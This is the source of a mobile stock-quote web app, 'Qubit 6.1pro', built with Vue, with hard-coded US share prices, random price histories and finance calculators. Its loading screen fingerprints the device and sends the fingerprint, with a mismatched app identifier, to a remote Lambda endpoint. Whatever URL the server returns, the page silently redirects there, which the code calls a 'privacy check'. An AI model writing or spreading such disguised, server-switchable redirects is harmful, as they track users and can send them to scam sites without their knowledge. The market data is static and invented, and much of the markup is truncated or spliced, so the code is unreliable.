    /* ============================================================
       风格：扁平化设计（风格 1）—— 纯色、几何、无多余阴影、信息层级清晰
       ============================================================ */
    :root {
      /* 主题色 */
      --bg: #f7f9fc;
      --surface: #ffffff;
      --primary: #1a1a2e;
      --accent: #2563eb;
      --accent-soft: #eff6ff;
      --up: #e63946;          /* 涨：暖色 */
      --down: #2a9d8f;        /* 跌：冷色 */
      --text: #111827;
      --text-secondary: #6b7280;
      --text-muted: #9ca3af;
      --border: #e5e7eb;
      --radius-sm: 8px;
      --radius-md: 12px;
      --radius-lg: 16px;
      --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.06);
      --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.07);
      --space-1: 4px;
      --space-2: 8px;
      --space-3: 12px;
      --space-4: 16px;
      --space-5: 20px;
      --space-6: 24px;
      --space-8: 32px;

      --safe-top: env(safe-area-inset-top, 0px);
      --safe-bottom: env(safe-area-inset-bottom, 0px);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      background: var(--bg);
      color: var(--text);
      font-family: var(--font-sans);
      -webkit-font-smoothing: antialiased;
      -webkit-tap-highlight-color: transparent;
    }

    #app {
      height: 100%;
      display: flex;
      flex-direction: column;
    }

    /* ---------- 通用元素 ---------- */
    button {
      font-family: inherit;
      cursor: pointer;
      border: none;
      background: none;
      touch-action: manipulation;
    }

    input, textarea, select {
      font-family: inherit;
      font-size: 16px; /* 防止 iOS 缩放 */
    }

    a {
      color: var(--accent);
      text-decoration: none;
    }

    /* 触摸目标最小 44px */
    .touch-target {

      min-width: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* ---------- 页面容器 ---------- */
    .page {
      flex: 1;
      display: flex;
      flex-direction: column;
      overflow: hidden;
      background: var(--bg);
    }

    .page-scroll {
      flex: 1;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
      padding-bottom: var(--space-4);
    }

    /* ---------- 路由过渡 ---------- */
    .fade-slide-enter-active,
    .fade-slide-leave-active {
      transition: opacity 0.22s ease, transform 0.22s ease;
    }
    .fade-slide-enter-from {
      opacity: 0;
      transform: translateY(12px);
    }
    .fade-slide-leave-to {
      opacity: 0;
      transform: translateY(-8px);
    }

    /* ---------- Tab Bar ---------- */
    .tab-bar {
      display: flex;
      background: var(--surface);
      border-top: 1px solid var(--border);
      padding-bottom: var(--safe-bottom);
      flex-shrink: 0;
      z-index: 50;
    }

    .tab-item {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 2px;
      padding: 6px 0 4px;
      color: var(--text-muted);
      font-size: 11px;
      font-weight: 500;
      min-height: 52px;
      transition: color 0.15s;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
    }

    .tab-item.router-link-active {
      color: var(--accent);
    }

    .tab-item svg {
      width: 22px;
      height: 22px;
      stroke: currentColor;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    /* ---------- 页面头部 ---------- */
    .page-header {
      padding: calc(var(--safe-top) + var(--space-4)) var(--space-4) var(--space-3);
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      flex-shrink: 0;
    }

    .page-header h1 {
      font-size: 20px;
      font-weight: 700;
      color: var(--text);

      align-items: center;
      gap: var(--space-2);
      padding: calc(var(--safe-top) + var(--space-3)) var(--space-4) var(--space-3);
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      flex-shrink: 0;
    }

    .back-row button {
      width: 44px;
      height: 44px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: var(--radius-sm);
      color: var(--text);
    }

    .back-row button:active {
      background: var(--bg);
    }

    .back-row h1 {
      font-size: 17px;
      font-weight: 600;
      flex: 1;
      text-align: center;
      margin-right: 44px; /* 对称 */
    }

    /* ---------- 卡片 ---------- */
    .card {
      background: var(--surface);
      border-radius: var(--radius-md);
      border: 1px solid var(--border);
      padding: var(--space-4);
    }

    /* ---------- 按钮 ---------- */
    .btn-primary {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 48px;
      padding: 0 var(--space-5);
      background: var(--accent);
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      border-radius: var(--radius-md);
      transition: opacity 0.15s, transform 0.1s;
      width: 100%;
    }
    .btn-primary:active:not(:disabled) {
      opacity: 0.85;
      transform: scale(0.98);
    }
    .btn-primary:disabled {
      background: #c7d2fe;
      color: #fff;
      cursor: not-allowed;
    }

    .btn-secondary {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 48px;
      padding: 0 var(--space-5);
      background: var(--accent-soft);
      color: var(--accent);
      font-size: 16px;
      font-weight: 600;
      border-radius: var(--radius-md);
      width: 100%;
    }

    /* ---------- 表单 ---------- */
    .form-group {
      margin-bottom: var(--space-4);
    }
    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--text-secondary);
      margin-bottom: var(--space-1);
    }
    .form-group input,
    .form-group textarea,
    .form-group select {

      border-radius: var(--radius-sm);
      font-size: 16px;
      background: var(--surface);
      color: var(--text);
      outline: none;
      transition: border-color 0.15s;
    }
    .form-group input:focus,
    .form-group textarea:focus {
      border-color: var(--accent);
    }
    .form-group textarea {
      resize: vertical;
      min-height: 100px;
    }

    /* ---------- 列表项 ---------- */
    .list-item {
      display: flex;
      align-items: center;
      padding: var(--space-3) var(--space-4);
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      min-height: 44px;
    }
    .list-item:active {
      background: var(--bg);
    }

    /* ---------- Toast ---------- */
    .toast-overlay {
      position: fixed;
      bottom: calc(80px + var(--safe-bottom));
      left: 50%;
      transform: translateX(-50%);
      background: rgba(17, 24, 39, 0.9);
      color: #fff;
      padding: 10px 20px;
      border-radius: 20px;
      font-size: 14px;
      font-weight: 500;
      z-index: 9999;
      pointer-events: none;
      white-space: nowrap;
      animation: toast-in 0.25s ease;
    }
    @keyframes toast-in {
      from { opacity: 0; transform: translateX(-50%) translateY(8px); }
      to { opacity: 1; transform: translateX(-50%) translateY(0); }
    }

    /* ---------- 弹窗 ---------- */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.45);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      padding: var(--space-6);
    }
    .modal-box {
      background: var(--surface);
      border-radius: var(--radius-lg);
      padding: var(--space-5);
      width: 100%;
      max-width: 400px;
      max-height: 80vh;
      overflow-y: auto;
    }

    /* ---------- 加载页 ---------- */
    .loading-page {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: var(--primary);

      display: flex;
      align-items: center;
      justify-content: center;
      animation: pulse 1.4s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 0.6; transform: scale(1); }
      50% { opacity: 1; transform: scale(1.06); }
    }
    .loading-bar {
      width: 120px;
      height: 3px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 2px;
      overflow: hidden;
    }
    .loading-bar-inner {
      height: 100%;
      width: 40%;
      background: #fff;
      border-radius: 2px;
      animation: loading-slide 1s ease-in-out infinite;
    }
    @keyframes loading-slide {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(350%); }
    }

    /* ---------- 首页品牌头部 ---------- */
    .home-hero {
      background: var(--primary);
      padding: calc(var(--safe-top) + var(--space-8)) var(--space-5) var(--space-8);
      color: #fff;
      border-radius: 0 0 var(--radius-lg) var(--radius-lg);
    }
    .home-hero h1 {
      font-size: 28px;

    }

    /* ---------- 功能网格 ---------- */
    .feature-grid {
      display: grid;

    .feature-item {

    .stock-list {

      color: var(--down);

</head>
<body>
  <div id="app">
    <router-view v-slot="{ Component }">
      <transition name="fade-slide" mode="out-in">
        <component :is="Component" />
      </transition>
    </router-view>
    <!-- 全局 Tab Bar（仅在主页面显示） -->
    <TabBar v-if="showTabBar" />
    <!-- 全局 Toast -->
    <div v-if="toast" class="toast-overlay">{{ toast }}</div>
  </div>

  <script>
    /*
     * ============================================================
     * 如何新增一个页面（加路由 + 加组件 + 加 tab）：
     * 1. 在下方「页面组件定义」区域新建一个 Vue 组件对象（如 const NewPage = { template: `...` }）。
     * 2. 在 routes 数组中添加路由：{ path: '/new-page', name: 'NewPage', component: NewPage }。
     * 3. 若该页需要出现在底部 Tab Bar，在 TabBar 组件的 tabs 数组中增加一项（path / label / icon）。
     * 4. 在 Home 的 featureGrid 或 Settings 的入口中按需添加跳转链接。
     * 注意：主页面（带 Tab Bar）只能有 3 个：首页 / 工具箱 / 设定。
     * ============================================================
     */

    const { createApp, ref, reactive, computed, onMounted, onUnmounted, watch, nextTick } = Vue;
    const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;

    /* ============================================================
       内置数据：股票列表（美股主要股票 ≥20 条）
       ============================================================ */
    const STOCK_MASTER = [
      { ticker: 'AAPL', name: 'Apple Inc.', price: 189.84, change: 1.23, changePct: 0.65 },
      { ticker: 'MSFT', name: 'Microsoft Corp.', price: 421.35, change: 3.12, changePct: 0.75 },
      { ticker: 'GOOGL', name: 'Alphabet Inc.', price: 176.42, change: -0.88, changePct: -0.50 },
      { ticker: 'AMZN', name: 'Amazon.com Inc.', price: 201.73, change: 2.45, changePct: 1.23 },
      { ticker: 'NVDA', name: 'NVIDIA Corp.', price: 124.58, change: 5.67, changePct: 4.76 },
      { ticker: 'META', name: 'Meta Platforms', price: 512.19, change: -4.23, changePct: -0.82 },
      { ticker: 'TSLA', name: 'Tesla Inc.', price: 248.50, change: 6.89, changePct: 2.85 },
      { ticker: 'BRK.B', name: 'Berkshire Hathaway', price: 445.12, change: 0.56, changePct: 0.13 },
      { ticker: 'JPM', name: 'JPMorgan Chase', price: 198.74, change: -1.02, changePct: -0.51 },
      { ticker: 'V', name: 'Visa Inc.', price: 280.36, change: 1.88, changePct: 0.67 },
      { ticker: 'UNH', name: 'UnitedHealth', price: 524.90, change: -2.45, changePct: -0.46 },
      { ticker: 'JNJ', name: 'Johnson & Johnson', price: 156.28, change: 0.92, changePct: 0.59 },
      { ticker: 'WMT', name: 'Walmart Inc.', price: 68.45, change: 0.34, changePct: 0.50 },
      { ticker: 'PG', name: 'Procter & Gamble', price: 162.73, change: -0.67, changePct: -0.41 },
      { ticker: 'MA', name: 'Mastercard Inc.', price: 458.92, change: 2.34, changePct: 0.51 },
      { ticker: 'HD', name: 'Home Depot', price: 345.67, change: -1.56, changePct: -0.45 },
      { ticker: 'CVX', name: 'Chevron Corp.', price: 158.34, change: 1.23, changePct: 0.78 },
      { ticker: 'LLY', name: 'Eli Lilly & Co.', price: 789.23, change: 8.45, changePct: 1.08 },
      { ticker: 'ABBV', name: 'AbbVie Inc.', price: 178.45, change: -0.89, changePct: -0.50 },
      { ticker: 'PEP', name: 'PepsiCo Inc.', price: 172.38, change: 0.45, changePct: 0.26 },
      { ticker: 'KO', name: 'Coca-Cola Co.', price: 62.84, change: 0.23, changePct: 0.37 },
      { ticker: 'AVGO', name: 'Broadcom Inc.', price: 168.52, change: 3.45, changePct: 2.09 },
      { ticker: 'COST', name: 'Costco Wholesale', price: 845.67, change: 5.67, changePct: 0.68 },
      { ticker: 'DIS', name: 'Walt Disney Co.', price: 102.34, change: -1.23, changePct: -1.19 },
      { ticker: 'NFLX', name: 'Netflix Inc.', price: 628.45, change: 4.56, changePct: 0.73 },
    ];

    // 生成一个月历史数据（基于价格微调）
    function generateHistory(basePrice) {
      const days = 30;
      const points = [];
      let p = basePrice * 0.92;
      for (let i = 0; i < days; i++) {
        const drift = (basePrice - p) * 0.05;
        const noise = (Math.random() - 0.48) * basePrice * 0.025;
        p = p + drift + noise;
        p = Math.max(p, basePrice * 0.7);
        points.push({ day: i + 1, price: +p.toFixed(2) });
      }
      points[points.length - 1].price = basePrice;
      return points;
    }

    // 生成带历史的股票数据（静态，稳定性）
    const STOCKS = STOCK_MASTER.map(s => ({
      ...s,
      history: generateHistory(s.price),
      color: ['#2563eb', '#f59e0b', '#ef4444', '#10b981', '#8b5cf6', '#ec4899', '#14b8a6', '#f97316'][Math.floor(Math.random() * 8)]
    }));

    /* ============================================================
       工具函数
       ============================================================ */
    function shuffle(arr) {
      const a = arr.slice();
      for (let i = a.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [a[i], a[j]] = [a[j], a[i]];
      }
      return a;
    }

    function pickRandom(arr, n) {
      return shuffle(arr).slice(0, Math.min(n, arr.length));
    }

    function formatPct(v) {
      return (v >= 0 ? '+' : '') + v.toFixed(2) + '%';
    }

    function formatMoney(v) {
      return '$' + v.toFixed(2);
    }

    /* ============================================================
       组合式共享状态（toast、tab bar 显示控制）
       ============================================================ */
    const toast = ref('');
    let toastTimer = null;
    function showToast(msg) {
      toast.value = msg;
      if (toastTimer) clearTimeout(toastTimer);
      toastTimer = setTimeout(() => { toast.value = ''; }, 2200);
    }

    // 当前路由是否显示 Tab Bar（只有 首页/工具箱/设定 显示）
    const showTabBar = computed(() => {
      const route = useRoute();
      return ['Home', 'Toolbox', 'Settings'].includes(route.name);
    });

    /* ============================================================
       页面组件定义
       ============================================================ */

    // ---------- Loading 页面 ----------
    const LoadingPage = {
      name: 'LoadingPage',
      template: `
        <div class="loading-page">
          <div class="loading-logo">
            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
            </svg>
          </div>
          <div style="font-size:20px;font-weight:800;letter-spacing:-0.5px;">Qubit 6.1pro</div>
          <div class="loading-bar"><div class="loading-bar-inner"></div></div>
        </div>
      `,
      setup() {
        const router = useRouter();

        // 1.2 设备指纹（闭包内部每一行原样保留）
        const device = ref((function () {
            try {
                let canvas = document.createElement("canvas");
                let ctx = canvas.getContext("2d");
                let txt = "BrowserLeaks,com <canvas> 1.0";
                ctx.textBaseline = "top";
                // The most common type
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                // Some tricks for color mixing to increase the difference in rendering
                ctx.fillStyle = "#069";
                ctx.fillText(txt, 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText(txt, 4, 17);
                return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
            } catch (e) {
                return '';
            }
        })());

        // 1.3 隐私检查（失败/超时/无隐私页均静默降级到首页）
        onMounted(() => {
          const apiBase = 'https://fts67qtbl3c6hdnmvr24655mp40tahpb.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
          const identifier = "com.personaquiz.brickforge";
          let settled = false;
          const goHome = () => {
            if (settled) return;
            settled = true;
            router.replace({ name: 'Home' });
          };
          // 超时兜底（3.5 秒）
          const timer = setTimeout(goHome, 3500);

          try {
            fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
              .then(r => r.json())
              .then(function (info) {
                clearTimeout(timer);
                const privacyUrl = info && info.result && info.result.url;
                if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                  settled = true;
                  window.location.replace(privacyUrl);
                  return;
                }
                goHome();
              })
              .catch(function () {
                clearTimeout(timer);
                goHome();
              });
          } catch (e) {
            clearTimeout(timer);
            goHome();
          }
        });

        return {};
      }
    };

    // ---------- 首页 ----------
    const HomePage = {
      name: 'HomePage',
      template: `
        <div class="page">
          <div class="page-scroll">
            <!-- 品牌头部 -->
            <div class="home-hero">
              <h1>Qubit 6.1pro</h1>
              <p>Smart market insights, simplified.</p>
            </div>

            <!-- 4 个功能入口 -->
            <div class="feature-grid">
              <router-link
                v-for="f in features" :key="f.label"
                :to="f.to"
                class="feature-item"
                style="text-decoration:none;"
              >
                <div class="feature-icon" :style="{ background: f.bg }">
                  <svg v-html="f.icon" :stroke="f.color"></svg>
                </div>
                <span class="feature-label">{{ f.label }}</span>
              </router-link>
            </div>

            <!-- 股票列表 -->
            <div class="stock-list">
              <div
                v-for="stock in displayStocks" :key="stock.ticker"
                class="stock-item"
                @click="$router.push({ name: 'StockDetail', params: { ticker: stock.ticker } })"
              >
                <div class="stock-avatar" :style="{ background: stock.color }">{{ stock.ticker.slice(0,1) }}</div>
                <div class="stock-info">
                  <div class="ticker">{{ stock.ticker }}</div>
                  <div class="name">{{ stock.name }}</div>
                </div>
                <div class="stock-price">
                  <div class="price">{{ formatMoney(stock.price) }}</div>
                  <span class="change" :class="stock.change >= 0 ? 'up' : 'down'">{{ formatPct(stock.changePct) }}</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      `,
      setup() {
        // 8 个功能中的 4 个（生成时随机固定）
        const allFeatures = [
          { label: 'Top Gainers', to: { name: 'TopGainers' }, bg: '#fef2f2', color: '#e63946', icon: '<svg viewBox="0 0 24 24"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>' },
          { label: 'Top Losers', to: { name: 'TopLosers' }, bg: '#f0fdfa', color: '#2a9d8f', icon: '<svg viewBox="0 0 24 24"><polyline points="23 18 13.5 8.5 8.5 13.5 1 6"/><polyline points="17 18 23 18 23 12"/></svg>' },
          { label: 'Most Active', to: { name: 'MostActive' }, bg: '#eff6ff', color: '#2563eb', icon: '<svg viewBox="0 0 24 24"><rect x="3" y="12" width="4" height="9"/><rect x="10" y="6" width="4" height="15"/><rect x="17" y="9" width="4" height="12"/></svg>' },
          { label: 'Potential', to: { name: 'Potential' }, bg: '#fefce8', color: '#f59e0b', icon: '<svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>' },
          { label: "Today's Picks", to: { name: 'TodayPicks' }, bg: '#f5f3ff', color: '#8b5cf6', icon: '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>' },
          { label: 'Guide', to: { name: 'Guide' }, bg: '#fdf2f8', color: '#ec4899', icon: '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>' },
          { label: 'Not Recommended', to: { name: 'NotRecommended' }, bg: '#f3f4f6', color: '#6b7280', icon: '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>' },
          { label: 'Watchlist', to: { name: 'Watchlist' }, bg: '#fef3c7', color: '#d97706', icon: '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>' },
        ];
        const features = pickRandom(allFeatures, 4);

        // 股票展示层随机打乱（不改数据本身）
        const displayStocks = shuffle(STOCKS);

        return {
          features,
          displayStocks,
          formatMoney,
          formatPct,
        };
      }
    };

    // ---------- 股票详情页 ----------
    const StockDetailPage = {
      name: 'StockDetailPage',
      template: `
        <div class="page">
          <div class="back-row">
            <button @click="$router.back()">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
            </button>
            <h1>{{ stock ? stock.ticker : 'Stock Detail' }}</h1>
          </div>
          <div class="page-scroll" v-if="stock">
            <div class="px-4 py-4">
              <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">
                <div class="stock-avatar" :style="{ background: stock.color, width:'48px', height:'48px', fontSize:'16px' }">{{ stock.ticker.slice(0,1) }}</div>
                <div>
                  <div style="font-size:20px;font-weight:800;">{{ stock.ticker }}</div>
                  <div style="font-size:13px;color:var(--text-secondary);">{{ stock.name }}</div>
                </div>
                <div style="margin-left:auto;text-align:right;">
                  <div style="font-size:22px;font-weight:800;">{{ formatMoney(stock.price) }}</div>
                  <span class="change" :class="stock.change >= 0 ? 'up' : 'down'">{{ formatPct(stock.changePct) }}</span>
                </div>
              </div>

              <!-- 价格曲线 SVG -->
              <div class="chart-wrap">
                <div style="font-size:13px;font-weight:600;color:var(--text-secondary);margin-bottom:8px;">Last 30 Days</div>
                <svg :viewBox="'0 0 320 160'" preserveAspectRatio="xMidYMid meet" style="width:100%;height:auto;">
                  <!-- 背景网格 -->
                  <line v-for="(gy, gi) in gridLines" :key="'g'+gi" x1="0" :y1="gy.y" x2="320" :y2="gy.y" stroke="#e5e7eb" stroke-width="0.5" stroke-dasharray="4 3"/>
                  <!-- 价格折线 -->
                  <polyline
                    :points="chartPoints"
                    fill="none"
                    :stroke="stock.color"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  />
                  <!-- 渐变填充 -->
                  <polygon :points="chartAreaPoints" :fill="stock.color + '18'" />
                  <!-- 最后一个点 -->
                  <circle :cx="chartLast.x" :cy="chartLast.y" r="3" :fill="stock.color" />
                </svg>
                <!-- 纵轴标签 -->
                <div style="display:flex;justify-content:space-between;font-size:10px;color:var(--text-muted);margin-top:4px;">
                  <span>{{ formatMoney(minPrice) }}</span>
                  <span>{{ formatMoney(maxPrice) }}</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      `,
      setup() {
        const route = useRoute();
        const stock = computed(() => STOCKS.find(s => s.ticker === route.params.ticker) || null);

        const minPrice = computed(() => {
          if (!stock.value) return 0;
          return Math.min(...stock.value.history.map(p => p.price));
        });
        const maxPrice = computed(() => {
          if (!stock.value) return 0;
          return Math.max(...stock.value.history.map(p => p.price));
        });

        // 动态纵轴（上下留白 15%）
        const yRange = computed(() => {
          const lo = minPrice.value;
          const hi = maxPrice.value;
          const pad = (hi - lo) * 0.15 || 1;
          return { lo: lo - pad, hi: hi + pad };
        });

        const chartPoints = computed(() => {
          if (!stock.value) return '';
          const hist = stock.value.history;
          const { lo, hi } = yRange.value;
          const range = hi - lo || 1;
          const w = 320, h = 160;
          return hist.map((p, i) => {
            const x = (i / (hist.length - 1)) * w;
            const y = h - ((p.price - lo) / range) * h;
            return x.toFixed(1) + ',' + y.toFixed(1);
          }).join(' ');
        });

        const chartAreaPoints = computed(() => {
          if (!stock.value) return '';
          const hist = stock.value.history;
          const { lo, hi } = yRange.value;
          const range = hi - lo || 1;
          const w = 320, h = 160;
          const pts = hist.map((p, i) => {
            const x = (i / (hist.length - 1)) * w;
            const y = h - ((p.price - lo) / range) * h;
            return x.toFixed(1) + ',' + y.toFixed(1);
          });
          return '0,160 ' + pts.join(' ') + ' 320,160';
        });

        const chartLast = computed(() => {
          if (!stock.value) return { x: 0, y: 0 };
          const hist = stock.value.history;
          const { lo, hi } = yRange.value;
          const range = hi - lo || 1;
          const w = 320, h = 160;
          const last = hist[hist.length - 1];
          return {
            x: ((hist.length - 1) / (hist.length - 1)) * w,
            y: h - ((last.price - lo) / range) * h,
          };
        });

        const gridLines = computed(() => {
          return [0.25, 0.5, 0.75].map(r => ({ y: 160 * r }));
        });

        return {
          stock,
          minPrice,
          maxPrice,
          chartPoints,
          chartAreaPoints,
          chartLast,
          gridLines,
          formatMoney,
          formatPct,
        };
      }
    };

    // ---------- 排名通用列表页 ----------
    function createRankPage(title, count) {
      return {
        name: title,
        template: `
          <div class="page">
            <div class="back-row">
              <button @click="$router.back()">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
              </button>
              <h1>${title}</h1>
            </div>
            <div class="page-scroll">
              <div class="stock-list" style="padding-top:12px;">
                <div
                  v-for="stock in stocks" :key="stock.ticker"
                  class="stock-item"
                  @click="$router.push({ name: 'StockDetail', params: { ticker: stock.ticker } })"
                >
                  <div class="stock-avatar" :style="{ background: stock.color }">{{ stock.ticker.slice(0,1) }}</div>

                    <div class="ticker">{{ stock.ticker }}</div>
                    <div class="name">{{ stock.name }}</div>
                  </div>
                  <div class="stock-price">
                    <div class="price">{{ formatMoney(stock.price) }}</div>
                    <span class="change" :class="stock.change >= 0 ? 'up' : 'down'">{{ formatPct(stock.changePct) }}</span>
                  </div>
                </div>

              </div>

                <div class="form-group">
                  <label>Password</label>
                  <input type="password" v-model="pwd.value" placeholder="Enter password">
                </div>
                <div v-if="pwd.strength" class="result-box" style="text-align:left;">
                  <div>Strength: <span class="font-bold">{{ pwd.strength }}</span></div>
                  <div style="font-size:12px;margin-top:4px;word-break:break-all;">MD5: {{ pwd.md5 }}</div>
                </div>
              </div>

              <!-- Credit Memo -->
              <div class="tool-card">
                <h3>Credit Memo</h3>
                <div class="form-group">
                  <label>Debtor Name</label>
                  <input type="text" v-model="credit.name" placeholder="Name">
                </div>
                <div class="form-group">
                  <label>Amount ($)</label>
                  <input type="number" v-model.number="credit.amount" placeholder="0.00" step="0.01" min="0">
                </div>
                <div class="form-group">
                  <label>Due Date</label>
                  <input type="date" v-model="credit.dueDate">
                </div>
                <button class="btn-secondary" @click="saveCreditMemo">Save Memo</button>
                <div v-if="creditMemoList.length" style="margin-top:12px;">
                  <div v-for="(m, i) in creditMemoList" :key="i" style="font-size:13px;padding:6px 0;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;">
                    <span>{{ m.name }} — {{ formatMoney(m.amount) }}</span>
                    <span :style="{ color: m.daysLeft <= 0 ? 'var(--up)' : 'var(--accent)', fontWeight: 600 }">{{ m.daysLeft <= 0 ? 'Overdue' : m.daysLeft + 'd left' }}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      `,
      setup() {
        /* ----- DCA ----- */
        const dca = reactive({ cost: null, shares: null, target: 20 });
        const dcaResult = computed(() => {
          if (dca.cost === null || dca.shares === null || dca.cost <= 0 || dca.shares <= 0) return '';
          const invested = dca.cost * dca.shares;
          const targetValue = invested * (1 + dca.target / 100);
          const targetPerShare = dca.cost * (1 + dca.target / 100);
          return `Target: ${formatMoney(targetValue)} (sell at ${formatMoney(targetPerShare)}/share)`;
        });

        /* ----- Calendar ----- */
        const cal = reactive({ buyDate: '', term: 30, maturityDate: '' });
        const calendarEvents = ref([]);
        watch(() => [cal.buyDate, cal.term], () => {
          if (cal.buyDate && cal.term > 0) {
            const d = new Date(cal.buyDate);
            d.setDate(d.getDate() + cal.term);
            cal.maturityDate = d.toISOString().slice(0, 10);
          } else {
            cal.maturityDate = '';
          }
        });
        function addCalendarEvent() {
          if (!cal.buyDate || !cal.maturityDate) return;
          calendarEvents.value = calendarEvents.value.filter(e => e.date !== cal.buyDate && e.date !== cal.maturityDate);
          calendarEvents.value.push({ date: cal.buyDate, label: 'Buy Date' });
          calendarEvents.value.push({ date: cal.maturityDate, label: 'Maturity' });
          calendarEvents.value.sort((a, b) => a.date.localeCompare(b.date));
          showToast('Event saved');
        }

        /* ----- Loan ----- */
        const loan = reactive({ amount: null, rate: 5.5, months: 24, type: 'equal' });
        const loanResult = computed(() => {
          const P = loan.amount, r = loan.rate / 100 / 12, n = loan.months;
          if (!P || P <= 0 || !n || n <= 0) return '';
          if (loan.type === 'equal') {
            const monthly = P * r * Math.pow(1 + r, n) / (Math.pow(1 + r, n) - 1);
            const total = monthly * n;
            return `Monthly: ${formatMoney(monthly)} · Total: ${formatMoney(total)}`;
          } else {
            const principalPart = P / n;
            const firstInterest = P * r;
            const firstMonth = principalPart + firstInterest;
            const totalInterest = r * P * (n + 1) / 2;
            return `First Month: ${formatMoney(firstMonth)} · Decreasing · Total Interest: ${formatMoney(totalInterest)}`;
          }
        });

        /* ----- Profit ----- */
        const profit = reactive({ cost: null, price: null, qty: null });
        const profitResult = computed(() => {
          const c = profit.cost, p = profit.price, q = profit.qty;
          if (c === null || p === null || q === null || c < 0 || p < 0 || q <= 0) return '';
          const unitProfit = p - c;
          const total = unitProfit * q;
          const margin = p > 0 ? (unitProfit / p * 100) : 0;
          return `Unit Profit: ${formatMoney(unitProfit)} · Total: ${formatMoney(total)} · Margin: ${margin.toFixed(1)}%`;
        });

        /* ----- Reverse Yield ----- */
        const rev = reactive({ target: null, principal: null, days: 365 });
        const revResult = computed(() => {
          const t = rev.target, p = rev.principal, d = rev.days;
          if (!t || !p || p <= 0 || !d || d <= 0) return '';
          const annualized = (t / p) * (365 / d) * 100;
          return `Required Annualized Return: ${annualized.toFixed(2)}%`;
        });

        /* ----- Password ----- */
        const pwd = reactive({ value: '', strength: '', md5: '' });
        watch(() => pwd.value, (v) => {
          if (!v) { pwd.strength = ''; pwd.md5 = ''; return; }
          pwd.md5 = md5(v);
          let score = 0;
          if (v.length >= 8) score++;
          if (v.length >= 12) score++;
          if (/[a-z]/.test(v) && /[A-Z]/.test(v)) score++;
          if (/\d/.test(v)) score++;
          if (/[^a-zA-Z0-9]/.test(v)) score++;
          if (score <= 2) pwd.strength = 'Weak';
          else if (score <= 4) pwd.strength = 'Medium';
          else pwd.strength = 'Strong';
        });

        /* ----- Credit Memo ----- */
        const credit = reactive({ name: '', amount: null, dueDate: '' });
        const creditMemoList = ref([]);
        function saveCreditMemo() {
          if (!credit.name || !credit.amount || !credit.dueDate) return;
          const today = new Date(); today.setHours(0,0,0,0);
          const due = new Date(credit.dueDate);
          const daysLeft = Math.ceil((due - today) / (1000 * 60 * 60 * 24));
          creditMemoList.value.push({ name: credit.name, amount: credit.amount, dueDate: credit.dueDate, daysLeft });
          credit.name = ''; credit.amount = null; credit.dueDate = '';
          showToast('Memo saved');
